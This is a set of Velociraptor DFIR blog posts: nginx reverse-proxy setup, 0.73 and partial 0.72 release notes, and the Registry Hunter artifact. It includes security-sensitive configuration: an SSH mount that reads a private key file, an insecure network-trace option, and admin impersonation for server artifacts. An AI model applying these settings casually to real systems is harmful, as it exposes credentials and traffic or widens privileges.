First I will install nginx according to any number of tutorials on the net (for [this](https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-18-04) or [this](https://www.nginx.com/blog/using-free-ssltls-certificates-from-lets-encrypt-with-nginx/)). My config file is as follows:

<script src="https://gist.github.com/scudette/03bf73f2430e4bb6e7923d69a232e77f.js" charset="utf-8"></script>

I am using certbot to manage the lets encrypt certificates and I have two main routes:

1. URLs starting with **/gui/** will be redirected to the Velociraptor GUI port (by default port 8889) using plain HTTP.

1. All other URLs will be redirected to the frontend port (port 8000) using plain http.

Now I need to make Velociraptor listen on plain http instead of the default TLS. I do this simply by adding the **use_plain_http: true** flag both to the GUI and Frontend sections.

![](../../img/19YhBBqOhnLVanACm3Vdbog.png)

I also specify the GUI to listen on the path starting with “/gui” instead of the root — this allows nginx to proxy the GUI at a different URL to the default.

On the client’s side, the server appears to be a proper SSL server. The client needs to connect to nginx which will present a valid certificate. Therefore the client needs to specify **use_self_signed_ssl: false** (or omit it) and also specify a https URL as the server’s location (i.e. **Client.server_urls: [https://test.velocidex-training.com/]**).

## Conclusions

We have seen that Velociraptor utilizes its own PKI to secure client/server communication. This PKI is used both to prevent interception of messages as well as preventing messages from being forged. The server verifies the client the message came from and the client verifies the server before it connects to it.

In addition, Velociraptor uses standard TLS communications to deliver messages using POST requests. TLS connections can either be self-signed (but pinned) or use public CA PKI. Using a standard network protocol allows Velociraptor to easily fit into any modern corporate network (which might include SSL interception proxies etc).

By understanding how the communication takes place, we saw how we can debug network problems and even configure a reverse proxy for TLS offloading — an important feature to be able to scale even higher.

If you are interested in learning more about Velociraptor, check out our courses on [https://www.velocidex.com/training/](https://www.velocidex.com/training/) or join us on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord).

---END OF FILE---

======
FILE: /content/blog/2024/2024-09-10-release-notes-0.73/_index.md
======
---
title: "Velociraptor 0.73 Release"
description: |
   Velociraptor Release 0.73 is available!

tags:
 - Release

author: "Mike Cohen"
date: 2024-09-10
noindex: false
---

I am very excited to announce that the latest Velociraptor release
0.73 is available for download.

In this post I will discuss some of the interesting new features.

## Special Thanks

We would like to extend our thanks to the entire Velociraptor
Community, with a special mention for [Andreas
Misje](https://github.com/misje) and [Justin
Welgemoed](https://github.com/predictiple) who provided invaluable
testing, feedback and ideas to make this release awesome!

## New Client functionality

### Built in Windows memory acquisition

Previously Velociraptor was able to acquire physical memory on Windows
using the Winpmem binary as an external tool - which was delivered to
the endpoint and executed to obtain the memory image.

In this release, the Winpmem driver is incorporated into the
Velociraptor binary itself so there is no need to introduce additional
binaries to the endpoint. The driver is inserted on demand when an
image is required using the new VQL function
[winpmem()](https://docs.velociraptor.app/vql_reference/misc/winpmem/). This
VQL function can compress the memory image, to make it faster to
acquire (less IO) and deliver over the network (less network bandwidth
required).

The ability to access physical memory simply is also leveraged with
the
[winpmem](https://docs.velociraptor.app/vql_reference/accessors/winpmem/)
accessor which allows for direct Yara scans with
`Windows.Detection.Yara.PhysicalMemory `


### Added parse_journald() and watch_journald() plugins

Journald is Linux's answer to structured logging. Previously
Velociraptor implemented a simple parser using pure VQL. In this
release Velociraptor introduces a dedicated `journald` parser.

The new parser emulates the windows event log format, with common
fields grouped under the `System` column and variable fields in
`EventData`.

![Journald parser](journald.png)

This release also introduces a new VQL plugin `watch_journald()` which
follows journald logs and forwards events to the server.

### Add RDP Cache parser to RDP Cache artifact

Attackers commonly use Remote Desktop (RDP) to laterally move between
systems. The Microsoft RDP client maintains a tile cache with
fragments of the screen.

Sometimes the RDP cache holds crucial evidence as to the activity of
the attacker on systems that ran the RDP client. This information is
now easily accessible using the new `Windows.Forensics.RDPCache`
artifact contributed by [Matt Green](https://github.com/mgreen27).

![Viewing the RDP cache tiles](rdp_cache.png)

### Added the ability to dump clear text network traffic for debugging

Velociraptor clients are often deployed in complex networks. It is
sometimes difficult to debug why network communications fail.

This release introduces the ability for the client to record the plain
text communications between the client and server to a local file for
debugging purposes.

Network communications are usually wrapped in TLS making network
captures useless for debugging. Because of the way Velociraptor pins
the TLS communications it is not easy to insert a MITM interceptor
proxy either.

Adding the following to the client's config will write plain text
communications into the specified file:

```yaml
Client:
   insecure_network_trace_file: /tmp/trace.txt
```

Running the client will show the following log message:
```
[INFO] 2024-09-19T11:50:07Z Insecure Spying on network connections in /tmp/trace.txt
```

Make sure to disable this trace in production and only use it for
debugging communications, as it does weaken the network security.

{{% notice note "Network traffic is still encrypted" %}}

Velociraptor uses two layers of encryption - messages between client
and server are encrypted using Velociraptor's internal PKI scheme, and
**in addition**, a HTTP over TLS connection is used to exchange those
messages.

This means that the trace file is still not really completely in plain
text - it contains the encrypted messages in among the clear text HTTP
messages.

However this should help debug issues around reverse proxies and MITM
proxies in production.

{{% /notice %}}


## New Server Functionality

### Improve granularity of flow state reporting.

In previous versions, flows could only be in the `RUNNING`, `FINISHED`
or `ERROR` states. When the user schedules a collection from an
endpoint, the collection is in the `RUNNING` state and when it is
completed it is either in the `FINISHED` or `ERROR` state.

However, this has proved to be insufficient when things go wrong,
leaving users wondering what is happening in cases where the client
crashes or reboots, or even if it becomes unresponsive. In such cases
sometimes flows remained stuck in the `RUNNING` state indefinitely, so
it is not easy for users to re-launch them.

In this release, the Velociraptor client goes through more states:

1. When the collection is initially scheduled, it is in the
   `Scheduled` state and has the icon <i class="fas fa-calendar-plus"></i>.
2. When the client checks in, the collection request is sent to the
   client, and the collection moves into the `In Progess` state <i
   class="fas fa-person-running"></i>.
3. The server will periodically check on the progress of the
   collection - if the server in unable to check for a period of time,
   the collection will now be marked as `Unresponsive` and have the <i
   class="fas fa-question"></i> icon.
4. If the client comes back online (for example after a restart), the
   server will query the client about the progress of in flight
   collections. The client can then confirm if these collections are
   not known, the collection will be marked as an `Error` with icon <i
   class="fas fa-exclamation"></i>.

Previously, the server sent all outstanding requests to the client at
the same time. This meant that if there were many hunts scheduled, all
requests were delivered immediately. If the client subsequently timed
out, crashed or disappeared from the network during execution, all
requests were lost leaving flows in the hung `RUNNING` state
indefinitely.

In this release the server only sends 2 requests simultaneously,
waiting until they complete, before sending further requests. This
means if the client reboots only the currently executing queries are
lost, and further queries will continue once the client reconnects.

![Collection status show finer granularity](collection_states.svg)


### Hunts can be tagged now.

Velociraptor enables powerful automation in everyday DFIR work. Some
users start many hunts automatically via the API or VQL queries.

Over time there can be many hunts active simultaneously, and they can
be used for multiple uses. In this release, the GUI's hunt view is
streamlined by enabling hunts to contains labels.

![Hunts can now have Tags](hunt_tags.svg)

Clicking on the hunt label in the table will automatically filter the
table for that label. Hunt Labels are a way to group large numbers of
hunts and clean up the display.

### Updated Table widget.

The Velociraptor GUI presents most data in tabular form. It is
important that tables are easy to navigate and use.  This release made
a lot of updates to the table view.


#### Pagination changes

The navigation pager is now placed at the top of the table.

![Velociraptor tables have been revamped](table_widget.svg)

#### Filtering columns

If a filter term starts with ! it will now be excluded from the rows
(i.e. a negative search term).

#### Resizing columns

Many tables have varying width columns. By default, Velociraptor will
try to fit column width automatically to make them more readable, but
sometimes it is necessary to manually adjust column widths for optimal
viewing.

Columns can now be resized by dragging the right edge of a cell or
header.

![Columns can be resized by dragging their right edge](resizing_columns.svg)


#### Column re-ordering

Column ordering usually depends on the VQL query that produces the
table. However it is sometimes easier to reorder columns on an adhoc
basis.

You can now reorder columns by dragging the column header and dropping
it on the new position.

![Columns can be reordered by drag and drop](reordering_columns.svg)

#### Compact table view

Sometimes columns contain a lot of data taking up large vertical
space. This makes it difficult to quickly review the table because the
extra row height makes the table unable to fit in the screen
vertically.

![Collapsing columns make the table easier to view](collapsing_columns.svg)


### Password encrypted ZIP files for VFS downloads.

Velociraptor is often used to fetch potentially malicious binaries
from endpoints for further analysis. Users can schedule a collection
from the endpoint and then download the binaries using the browser.

However, this can sometimes result in analyst workstations triggering
virus scanners or other warnings as they download potential malware.

As in previous versions, the user can set a download password in their
preferences. However, previously the password only applied to hunt or
collection exports.

![Setting password for downloads globally](setting_password.svg)

In this release, the password setting also applies to individual file
downloads such as the VFS


![Downloads are password protected](encrypted_downloads.svg)

Or the uploads tab in specific collections.

![Individual file downloads can be password protected](single_file_downloads.svg)

### Post-processing preservation artifacts

The `Windows.KapeFiles.Targets` artifact allows to collect many bulk
forensic artifacts like registry hives etc. People often use it to
collect offline collections for preservation of hosts.

Although best practice is to **also** collect parsing artifacts at the
same time, sometimes this is left out (See [Preserving Forensic
Evidence
](https://docs.velociraptor.app/training/playbooks/preservation/) for
a full discussion. It is particularly problematic when using the
offline collector to collect the `Windows.KapeFiles.Targets` artifact,
because once the collection is imported back into Velociraptor there
is no possibility or returning to the endpoint to collect other
artifacts.

In this case the user needs to parse the collected raw files (for
example collecting the `$MFT` then needing to apply `Windows.NTFS.MFT`
to parse it).

In the new release, a notebook suggestion was added to
`Windows.KapeFiles.Targets` to apply a remapping on the collection in
such as way that some regular artifacts designed to run on the live
system can work to some extent off the raw collection.

Let's examine a typical workflow. I will begin by preparing an offline
collector with the `Windows.KapeFiles.Targets` artifact configured to
collect all event logs.

![Building an offline collector](building_offline_collector.png)


Once the collection is complete I receive a ZIP file containing all
the collected files. I will now import it into Velociraptor.

![Importing the offline collection](importing_offline_collection.svg)

Since this is an offline client and not a real client, Velociraptor
will create a new client id to contain the collections.

![The imported collection looks just like any other collection](kapefiles_collection.svg)

Of course we can not schedule new collections for the client because
it is not a real client, but once imported, the offline collection
appears as just another collection in the GUI.

Suppose now I wanted to use the `Windows.Hayabusa.Rules` artifact to
triage the system according to the Hayabusa Sigma ruleset. Ordinarily,
with a connected endpoint, I would just schedule a new collection on
the endpoint and receive the triaged data in a few minutes.

However, this is not a real client since I used the offline collector
to retrieve the event logs. I can not schedule new collections on it
as easily (without preparing a new offline collector and manually
running it on the endpoint).

Instead, the `Windows.KapeFiles.Targets` artifact now offers a VQL
snippet as a notebook suggestion to post process the collection. I
access this from the collection's notebook.

![Post processing the KapeFiles collection with a notebook suggestion](post_process_kapefiles.svg)


The new cell contains some template VQL. I can modify it to run other
artifacts. In this case I will collect the `Windows.Hayabusa.Rules`
artifact with all the rules (event noisy ones) and `Windows.NTFS.MFT`
artifact.

![Modifying VQL to run other artifacts](post_process_kapefiles_2.svg)

The post processing steps added a new distinct collection to the
offline client, as if we collected it directly from the
endpoint. However, the artifacts were collected from the triage files
directly imported from the offline bundle.

![A new distinct collection is added](post_process_kapefiles_3.svg)

Although this new workflow makes it more convenient to post process
bulk file triage collections, note that this is not an ideal workflow
for a number of reasons (for example parsing event logs on systems
other than where they were written will result in a loss of some log
messages).

It is always better to collect and parse the required artifacts
directly from the endpoint (even in an offline collection) and **not**
rely on bulk file collections.

### Redesigned timelines

Timelines has been part of the Velociraptor GUI for a few releases
now. In this release we have really expanded their functionality into
a complete end to end timelining analysis tool.

The details of the new workflow are described in the [Timelines in
Velociraptor]({{% ref "/blog/2024/2024-09-12-timelines/" %}}) blog
post, but below is a screenshot to illustrate the final product - an
annotated timeline derived from analysis of multiple artifacts.

![The complete timeline with annotations](../2024-09-12-timelines/supertimeline.svg)

###  Added Timesketch integration artifacts

In addition to an enhanced built in timelining feature, this release
also features enhanced integration with `Timesketch`, a popular open
source timelining tool. The details of the integration are also
discussed in the blog post above, but here is a view of Timesketch
with some Velociraptor timelines exported.

![Viewing timelines in Timesketch](../2024-09-12-timelines/timesketch_view.svg)

### Client metadata fields can now be indexed and searched.

Velociraptor allows arbitrary key/value pairs to be added the Client
record. We call this the `Client Metadata`. Previously the metadata
could be set in the GUI but there was no way to search for it from the
main search bar.

In this release client metadata can be searched directly in the search
box. Additionally, the user can specify custom metadata fields in the
configuration file to have all clients present this information.

Consider this example. I wanted to record maintain the department that
each endpoint belongs to. I will add the following the server's
configuration file:

```yaml
defaults:
  indexed_client_metadata:
    - department
```

This tells the server to index the client metadata field
`department`. This allows the user to search all clients by
department.

Indexed metadata fields exist on all clients. Additional non-indexed
fields can be added by the user.

![Client metadata fields can be indexed or free form](client_metadata.svg)

### Enable a server artifact to specify an impersonation user.

Velociraptor's user permission system ensures that only users that are
granted certain permissions are able to carry out actions that require
these permissions. For example, to launch an external binary on the
server is a highly privileged permission (basically it gives a server
shell). So the `execve()` plugin requires a special `EXECVE`
permission to run. This is normally only given to administrators on
the server.

If a user has a lower role (e.g. `investigator`) they are not able to
shell out by calling the `execve()` VQL plugin in a notebook or a
server artifact.

While this is what we want in most cases, sometimes we want to provide
the low privileged user a mechanism for performing privileged
operations in a safe manner. For example, say we want to allow the
`investigator` user to call the `timesketch` CLI tool to upload some
timelines. It clearly would not be appropriate to allow the
`investigator` user to call **any** arbitrary programs, but it is
probably ok to allow them to call the `timesketch` program
selectively in a controlled way.

This idea is very similar to Linux's SUID or Windows's impersonation
mechanisms - both mechanisms allow a low privileged user to run a
program as another high privileged user, taking on their privileges
for the duration of the task. The program itself controls access to
the privileged commands by suitably filtering user input.

In the 0.73 release, server artifacts may specify that they will run
with an impersonated user.

Consider the following artifact:
```yaml
name: Server.Utils.StartHuntExample
type: SERVER
impersonate: admin
sources:
  - query: |
      -- This query will run with admin ACLs.
      SELECT hunt(
        description="A general hunt",
        artifacts='Generic.Client.Info')
      FROM scope()
```

This artifact launches a new hunt for the `Generic.Client.Info`
artifact. Usually a user needs the `START_HUNT` permission to actually
create a new hunt.

Ordinarily, if a user has the `COLLECT_SERVER` permission allowing
them to collect server artifacts, they will be able to start this
server artifact, but unless they **also** have the `START_HUNT`
permission they will be unable to schedule the new hunt.

With the `impersonate` field, any user that is able to start
collecting this artifact will be able to schedule a hunt.

This feature allows an administrator to carefully delegate higher
privilege tasks to users with lower roles. This makes it easier to
create users with lower levels of access and improves a least
privilege permission model.

## Conclusions

There are many more new features and bug fixes in the latest release.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2024/2024-04-12-registry-hunter/_index.md
======
---
title: "The Registry Hunter"
description: |
    As DFIR practitioners, the Windows registry is a treasure trove of information.

date: 2024-04-11T23:25:17Z
draft: false
weight: 40
tags:
- Detection
- Forensics
- Windows
---

As DFIR practitioners, the Windows registry is a treasure trove of
information. The Windows registry stores information about system
configuration and therefore we can use it to understand what software
was installed, how it was configured and hunt for mis-configuration or
deliberate compromises to achieve attacker persistence.

There are many tools out there to extract forensically relevant
information from the registry. However, the problem is challenging:

1. The registry contains thousands of keys and values. While it is
   possible to manually examine relevant keys and values this is
   extremely time consuming and error prone.

2. Some of the values are encoded in non-obvious ways. For example, it
   is common for registry values to store times encoded as Unix epoch
   integers, Windows File Time integers or even encoded into binary
   encoded blobs. Since the registry is really intended for machine
   consumption it is not always easy to parse human readable
   information out of the values.

3. Often relevant information is spread across a number of keys and
   values. For a human examiner to make sense of the information, the
   information needs to be collected into a single entity.

4. Registry information does not have contextually significant
   explanation about what the values actually mean, and how
   significant they are in an investigation. Although this is left to
   the experience of the examiner, it is useful to attach some
   comments or description to the analysis.

## Velociraptor Artifacts

Velociraptor has been used to extract values from the windows registry
for a long time. In Velociraptor the registry is accessible via the
`registry` accessor (to access the registry via the APIs) and the
`raw_reg` accessor to parse raw registry hives. See [The Registry
Accessor]({{% ref "/docs/forensic/filesystem/#the-registry-accessor"
%}}) to read more about how Velociraptor accesses the registry.

This allows Velociraptor to use simple `glob()` expressions to find
keys and values in the registry. For example in the
[Windows.Registry.Sysinternals.EulaCheck]({{% ref
"artifact_references/pages/windows.registry.sysinternals.eulacheck.html"
%}}) artifact we can search for evidence of running `Sysinternal
tools`. The following is a simplified query:

```vql
SELECT OSPath[-2] as ProgramName,
    lookupSID(sid=OSPath[1]) AS Username,
    OSPath.Dirname as Key,
    Mtime AS TimeAccepted,
    Data.value  AS EulaAccepted
FROM glob(globs='''HKEY_USERS\*\Software\Sysinternals\*\EulaAccepted''',
          accessor='registry')
```

This artifact works pretty well:

1. The artifact zeros in on the relevant values in the registry
   without user intervention - the investigator does not have to know
   or care where the relevant `Sysinternal Eula` values are.
2. The artifact decodes the values to interpret the user action (did
   the user accept the EULA?) and also maps the SID back to a
   username.
3. The artifact contains sufficient human description to elicit
   action - what does it mean if a user accepted the EULA? Is this
   fact relevant to the investigation?

While very effective, over time the number of registry artifacts in
Velociraptor has grown. From the point of view of the investigator it
is becoming more difficult to use:

- We need to remember many smaller artifacts that target the registry
  to collect.
- We need to consider the output separately for each artifact.

## Some problems with the above approach

You will notice that the above artifact searches the `NTUSERS`
hive. This hive contains each user's `ntuser.dat` file which is
mounted when the user logs in.

While the artifact works very well for currently logged users, it will
be unable to see any users who are currently not logged into the
system! This can cause a lot of evidence to be missed.

The problem here is that the registry is composed of different hives
and some hives may be mounted at different times. However, when we
analyze the registry we often want to access all hives!

When we use the API to access the registry, we could be missing hives
that are not currently mounted. Conversely when we use raw registry
parsing to only look at hive files we will be missing volatile keys
that are not always written to the hives.

In the specific case of `Windows.Registry.Sysinternals.EulaCheck` the
artifact also offers an alternate analysis method which looks at the
`ntuser.dat` files themselves. However this has to be added
specifically for each artifact.

## What do other tools do?

Investigator focused tools typically attempt to analyze the whole
registry. For example, `regripper` or `RECmd/Registry Explorer` present a
GUI to the registry and simply tag keys and values based on their
significance. This is very convenient for the investigator, as they
only need to run the analysis once then examine the output manually.

While this is effective for analyzing a small number of machines, it
can not be easily scaled to large hunts on thousands of machines where
we need a more machine readable output.

The `RECmd Batch` project is an interesting idea forward. It started
off as an automated Batch File to drive `RECmd/Registry Explorer`
analysis by only collecting relevant keys/value and tagging these with
category and description labels.

Here is an example `RECmd Batch` rule corresponding to the above artifact:

```
    -
        Description: Sysinternals
        HiveType: NTUSER
        Category: Installed Software
        KeyPath: SOFTWARE\Sysinternals\*
        ValueName: EulaAccepted
        Recursive: false
        Comment: |
           Displays all SysInternals Tools that had the EULA accepted,
           indicating either execution of the tool or the Registry values
           were added intentionally prior to execution
```

This rule attaches a description and category to the `EulaAccepted`
value and also includes how to find it. There is also a useful comment
to drive the investigator towards assessing the importance of these
findings.

The `RECmd Batch` format also has some basic registry interpretation
built in (such as `FILETIME` to interpret timestamps), but more
complex interpretation is deferred to `Registry Plugins` which are `C#
programs` specifically designed to interpret more complex keys or
values. The use of `C#` makes writing registry plugins less accessible
and more complex.

## So what do we actually want?

We wanted to have a single artifact that hunts the entire registry
quickly and efficiently:

1. Combining all the specific registry based artifacts into a single
   one so investigators don't have to remember all the different
   artifacts - a single shot collection should be all that is needed
   to cover all registry based evidence.
2. All relevant information should be grouped by `Category` and
   `Description`. The artifact should make it easy to zero in on
   specific categories depending on the investigator's needs.
3. Ideally group together related key/values for quick analysis - this
   is needed to remove the cognitive load on the investigator in
   reviewing thousands of related values.
3. The artifact should be collected in different contexts:
   * On a live system using the registry API.
   * Offline on a collection of Registry Hive Files
   * Automatically take care of subtleties such as `NTUser.dat` mounts
     (as described about).

This is what the registry hunter is all about!

## The Registry Hunter

The Registry Hunter project is maintained at
https://github.com/Velocidex/registry_hunter/ and contains a compiler
that combines a set of `Rules` into a final artifact. This allows
users to contribute specific rules targeting specific keys and value
in the registry.

### Remapping the registry hives

To make it easier to write Registry Hunter rules and also to make it
easier to apply those rules in different situations, we want to
present a unified view of the registry to rule authors. The rule
authors should not need to care about if a registry hive is mounted or
available.

In recent versions, Velociraptor implements a powerful mechanism to
`remap` accessors within the name space. You can read about [Remapping
Accessors]({{% ref "/docs/forensic/filesystem/remapping/" %}}) to
understand how this is done.

The Registry Hunter artifact will map the relevant hives into the
`registry` accessor namespace using a number of different strategies.

The below diagram illustrates how the remapping works with the `Raw
Hives` strategy. In this configuration, the `registry` accessor is
remapped to using all the raw registry hives and does not use the API
at all.

![Remapping the registry accessor](registry_hunter_remapping.png)

The rules, however, don't really need to know about this - they just
assume they can access the whole registry using the `registry`
accessor. For example, when a rule accesses the key
`HKEY_USERS\Administrator\Software`, the key will be automatically
parsed from the `Software` hive at `C:\Users\Administrator\NTUSER.dat`

Depending on the remapping strategy some hives will be directly
accessible with the API, or remapped from raw registry hives:

* `API`: This strategy uses the API for most hives, except the
  `HKEY_LOCAL_MACHINE\Security` hive which is normally blocked with
  the API. Additionally, the `SAM` is mounted under `/SAM` and
  `Amcache` under `/Amcache` since these are not usually accessible
  via the API.
   * This strategy will not be able to see users who are not logged
     in, as it does not map the `ntuser.dat`.
   * Using the API is a bit faster than parsing the raw reg hives so
     this is recommended for frequent parsing or where performance is
     important.
* `API And NTUser.dat`: This strategy uses the API as above, except it
  also maps all the user's `ntuser.dat` files under the `/HKEY_USERS`
  key.
* `Raw Hives`: This strategy does not use the API, and instead maps
  all raw hives into the same `registry` accessor namespace.

The default remapping strategy is `API And NTUser.dat` which is
suitable for direct remote collections. If you are collecting this
artifact on a dead-disk mount you will need to use the `Raw Hives`
strategy to direct all registry API calls to raw registry parsing.

### Importing the latest version of the Registry Hunter artifact

To use the artifact you will need to import it into the server by
collecting the `Server.Import.RegistryHunter` server artifact. This
ensures you have the latest version.

### Collecting the artifact

When collecting the artifact from a remote system, you will be able to
select which rule categories to collect - by default all rules are
collected. The default remapping strategy is also selected here.

![Hunting the registry](hunting_the_registry.png)


### The Rule format

Rules are specified as simple YAML clauses in a rule file. Here is the
rule that specifies the `SysInternals EULA` detection.

```yaml
- Author: Andrew Rathbun
  Description: Sysinternals
  Category: Installed Software
  Comment: Displays all SysInternals Tools that had the EULA accepted, indicating
    either execution of the tool or the Registry values were added intentionally prior
    to execution
  Glob: '*\SOFTWARE\Sysinternals\*\EulaAccepted'
  Root: HKEY_USERS
  Filter: NOT IsDir
  Details: |
    x=>dict(Program=x.OSPath[-2], FirstRunTimestamp=x.Mtime)
```

The search glob is split into a glob part and a `Root` part. The
`Root` refers to the place within the registry namespace where the
hive is mapped (more on this below).

The registry hunter will compile this rule into a similar query to

```vql
    SELECT Rule.Description AS Description,
           Rule.Category AS Category,
           OSPath, Mtime,
           eval(func=Metadata.Details) AS Details
    FROM glob(globs=Rule.Glob, root=Rule.Root, accessor="registry")
    WHERE eval(func=Rule.Filter)
```

This rule will search the provided glob expression on the provided
root directory looking for values (the filter `x=>NOT IsDir` captures
values and rejects keys).

Matching values will cause the `Details` function to be evaluated. The
`Details` field contains a VQL [lambda function]({{% ref
"/docs/vql/#vql-lambda-functions" %}}) that will be evaluated on the
found keys or values. The following values will be available:

- `x.OSPath` contains the OSPath of the matching registry key or value
- `x.Mtime` contains the Modification time of the key

The above example returns a dictionary documenting the program and
the modification time.

![Sysinternal hunt output](sysinternals_reg.png)

A more complex rule is the following which assembles the `Most
Recently Used` values in the `Run Box`:

```yaml
- Author: Andrew Rathbun
  Description: "RunMRU: Tracks commands from the Run box in the Start menu"
  Category: Program Execution
  Root: HKEY_USERS
  Glob: '*\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
  Filter: x=>IsDir
  Preamble:
  - |
    LET CalculateMRU(OSPath) = SELECT GetValue(OSPath=OSPath + g1) AS value
        FROM parse_records_with_regex(accessor="data",
        file=GetValue(OSPath=OSPath + "MRUList"), regex="(.)")

  - |
    LET FetchKeyValues(OSPath) = to_dict(item={
      SELECT Name AS _key, Data.value AS _value
      FROM glob(globs="*", accessor="registry", root=OSPath)
    })

  Details: |
    x=>dict(MRU=CalculateMRU(OSPath=x.OSPath).value,
            All=FetchKeyValues(OSPath=x.OSPath))
```

![Calculating the MRU order](mru.png)

The similar `RECmd Batch` rule actually relies on custom `C#` code to
reassemble the MRU lists. This is problematic in practice because we
would need to rebuild and redeploy compiled code to the
endpoint. Instead it is much more efficient to implement the
reassembly algorithm in VQL and include it directly in this rule.

The Registry Hunter does rely on specialized processing or specific
registry plugins and simply implements all the complex parsing
directly in VQL - allowing us to upgrade the parsers on demand without
needing to recompile any code.

Notice how the `Details` lambda rule is able to reference helper
functions defined in the `Preamble` section. This allows us to create
reusable VQL functions that can be used from many rules.

You can see many helpful VQL functions defined in the preamble of the
common rule sets.

## Presenting the results of the analysis

The Registry Hunter is designed to be a one shot, collect everything
type of artifact. This allows investigators to simply use it in all
cases and just view relevant results depending on their needs.

To facilitate this use, the artifact creates a custom notebook
breaking the results by category. The user can then begin examining
the hits for each category that is relevant to the case.

![Initial notebook](initial_notebook.png)

For example, suppose I was interested in anything that was related to
`PsExec`, I would write a notebook query of the form:

```sql
SELECT Description, Category, OSPath AS Key, Mtime, Details FROM source()
WHERE Details =~ "psexec"
```

![Isolating all psexec information](hunting_for_psexec.png)

This query will show all information that is vaguely related to
`PsExec`, we see a number of corroborating evidence from the different
Rules:

1. `Userassist`, `AppCompatCache` and `Sysinternals` rule all match
2. We can see when the program was initially installed, last used and
   other interesting information.
3. Note that here we collect multiple related results from multiple
   categories.

## Conclusions

The Registry Hunter is an unified artifact that compiles separate
rules hunting in the registry into a single, easy to collect and very
fast artifact. Long term we aim to consolidate all the discrete
registry based artifacts into this one artifact.

We would really love to hear feedback or see contributions to the
Registry Hunter through our GitHub repository
https://github.com/Velocidex/registry_hunter/ and issue board. But you
can start using it right now if you would love to test it.

{{% notice "warning" %}}

The Registry Hunter uses newer VQL features available since release
0.72 and so will only work on clients newer than that version.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/blog/2024/2024-03-10-release-notes-0.72/_index.md
======
---
title: "Velociraptor 0.72 Release"
description: |
   Velociraptor Release 0.72 is now in full release.
   This post discusses some of the new features.

tags:
 - Release

author: "Mike Cohen"
date: 2024-03-10
---

I am very excited to announce that the latest Velociraptor release
0.72 is now available. You can also watch a video walkthrough of this
post here https://www.youtube.com/watch?v=FwmFYmTQxeA

In this post I will discuss some of the interesting new features.

## Version scheme update

Traditionally Velociraptor followed the GRR version format and that
has 4 numbers - so we had 0.6.5 and then if we needed to do a patch
release we would do 0.6.5-1 etc.

It turns out this is not compatible with Semantic Versioning exactly
which needs to have exactly 3 versions: a `MAJOR` version, a `MINOR`
version and a `PATCH` version. This causes problems with packaging
systems which expect semantic versioning like that for example `RPM`,
`DEB` or `MSI`. We also use Semantic Versioning internally to compare
versions (for example to determine if we should upgrade a Tool
definition )

So in this release we are taking the brave step of conforming with
Semantic Versioning more correctly and officially dropping the second
dot to have a `MAJOR` version of 0, a `MINOR` version of 72 and then
`PATCH` releases after that (starting with 0).

That means our next version will be `0.72.0` and if we need to release
patches after the release it will be `0.72.1` , `0.72.2` etc.

## EWF Support

Velociraptor has introduced the ability to analyze dead disk images in
the past. Although we don't need to analyze disk images very often,
the need comes up occasionally.

While previously Velociraptor only supported analysis of DD images
(AKA "Raw images"). Most people use a standard acquisition software to
acquire the image which uses the common EWF format to compress the
image.

In this release, Velociraptor supports EWF (AKA E01) format using the
`ewf` accessor. This allows Velociraptor to analyze E01 image sets.

To analyse dead disk images use the following steps:

1. Create a remapping configuration that maps the disk accessors into
   the E01 image. This automatically diverts VQL functions that look
   at the filesystem into the image instead of using the host's
   filesystem. In this release you can just point the
   `--add_windows_disk` option to the first disk of the EWF disk set
   (the other parts are expected to be in the same directory and will
   be automatically loaded).

   The following creates a remapping file by recognizing the windows
   partition in the disk image.

   ```sh
   $ velociraptor-v0.72-rc1-linux-amd64  deaddisk \
      --add_windows_disk=/tmp/e01/image.E01 /tmp/remapping.yaml -v
   ```

2. Next we launch a client with the remapping file. This causes any
   VQL queries that access the filesystem to come from the image
   instead of the host. Other than that the client looks like a
   regular client and will connect to the Velociraptor server just
   like any other client. To ensure that this client is unique you can
   override the writeback location (where the client id is stored) to
   a new file.

   ```sh
   $ velociraptor-v0.72-rc1-linux-amd64  --remap /tmp/remapping.yaml \
      --config ~/client.config.yaml client -v \
      --config.client-writeback-linux=/tmp/remapping.writeback.yaml
   ```

![](ewf.png)

## Allow remapping clients to use SSH accessor

Sometimes we can not deploy the Velociraptor client on a remote
system. For example, it might be an edge device like an embedded Linux
system or it may not be directly supported by Velociraptor.

In 0.7.1, Velociraptor introduced the `ssh` accessor which allows VQL
queries to use a remote `ssh` connection to access remote files.

This release added the ability to apply remapping in a similar way to
the dead disk image method above to run a `Virtual Client` which
connects to the remote system via SSH and emulates filesystem access
over the `sftp` protocol.

To use this feature you can write a remapping file that maps the ssh
accessor instead of the `file` and `auto` accessors:

```yaml
remappings:
- type: permissions
  permissions:
  - COLLECT_CLIENT
  - FILESYSTEM_READ
  - READ_RESULTS
  - MACHINE_STATE
- type: impersonation
  os: linux
  hostname: RemoteSSH
- type: mount
  scope: |
    LET SSH_CONFIG <= dict(hostname='localhost:22',
      username='test',
      private_key=read_file(filename='/home/test/.ssh/id_rsa'))

  from:
    accessor: ssh

  "on":
    accessor: auto
    path_type: linux

- type: mount
  scope: |
    LET SSH_CONFIG <= dict(hostname='localhost:22',
      username='test',
      private_key=read_file(filename='/home/test/.ssh/id_rsa'))

  from:
    accessor: ssh

  "on":
    accessor: file
    path_type: linux
```

Now you can start a client with this remapping file to virtualize
access to the remote system via SSH.

```
$ velociraptor-v0.72-rc1-linux-amd64  --remap /tmp/remap_ssh.yaml \
   --config client.config.yaml client -v \
   --config.client-writeback-linux=/tmp/remapping.writeback_ssh.yaml \
   --config.client-local-buffer-disk-size=0
```

![](ssh.png)

## GUI Changes

The GUI has been improved in this release.

### Inbuilt Stacking support

One very common task in DFIR is
[stacking](https://www.youtube.com/watch?v=nJNMLxmq9w8). This is a
powerful technique to quickly understand what had happened on the
endpoint and what is normal (and by extension unusual) on an endpoint.

While Velociraptor has always been able to do stacking within a post
processing notebook by using the `GROUP BY` VQL operator to count the
number of occurrences broken by category. When the user wanted to
actually see all those items, they needed to run a second VQL query to
